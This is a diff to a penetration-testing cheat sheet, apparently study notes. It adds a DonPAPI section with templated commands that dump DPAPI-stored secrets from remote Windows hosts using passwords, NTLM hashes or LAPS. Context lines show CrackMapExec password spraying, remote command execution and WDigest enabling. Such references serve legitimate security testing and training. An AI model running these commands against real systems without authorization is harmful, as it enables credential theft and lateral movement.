@@ -108,6 +108,7 @@ Thank you for reading.
 		- [sqsh](#sqsh)
 	- [Password Attacks](#password-attacks-1)
 		- [CrackMapExec](#crackmapexec)
+		- [DonPAPI](#donpapi)
 		- [fcrack](#fcrack)
   		- [Group Policy Preferences (GPP)](#group-policy-preferences-gpp)
 		- [hashcat](#hashcat)
@@ -2406,6 +2407,15 @@ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wor
 crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'net user Administrator /domain' --exec-method smbexec
 crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --wdigest enable
 crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'quser'
+```
+
+## DonPAPI
+
+```c
+DonPAPI <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
+DonPAPI -local_auth <USERNAME>@<RHOST>
+DonPAPI --hashes <LM>:<NT> <DOMAIN>/<USERNAME>@<RHOST>
+DonPAPI -laps <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
 ```
 
 #### fcrack
